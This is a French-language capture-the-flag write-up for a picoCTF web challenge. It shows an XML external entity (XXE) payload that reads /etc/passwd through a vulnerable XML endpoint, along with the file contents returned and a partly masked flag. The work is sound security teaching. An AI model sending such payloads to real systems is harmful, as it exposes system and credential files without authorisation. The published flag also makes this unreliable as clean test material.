# SOAP

## Enoncé
Catégorie : [Web Exploitation](../)

Points : 100

Tags : `XXE`

Description :
> The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?  
> Web Portal

Hints :
1. XML external entity Injection


## Approche

Le portail web présente différents établissements universitaires, pour lesquels on peut avoir des informations complémentaires via les boutons `Details`.

On examine les appels HTTP réalisés lorsqu'on clique sur un bouton `Details`, via la vue Network des DevTools du navigateur :
![Vue Netwok](devtools_network.png)

On va essayer d'exploiter cet appel, dont le payload est du type :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<data>
  <ID>2</ID>
</data>
```


## Solution

Comme indiqué par le tag `XXE` de l'énoncé, on se tourne vers l'exploitation d'une faille de ce type.

Pour accéder au fichier `/etc/passwd`, au lieu d'utiliser le payload classique, on soumet celui-ci :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "/etc/passwd" >]>
<data>
    <ID>&xxe;</ID>
</data>
```

On réalise l'opération avec `curl`. En retour on obtient le contenu du fichier `/etc/passwd`, avec le flag présent dedans :
```txt
Invalid ID: root:x:0:0:root:/root:/bin/bash
...
picoctf:x:1001:picoCTF{XML_3xtern@l_3nt1t1ty_xxxxxxxx}
```
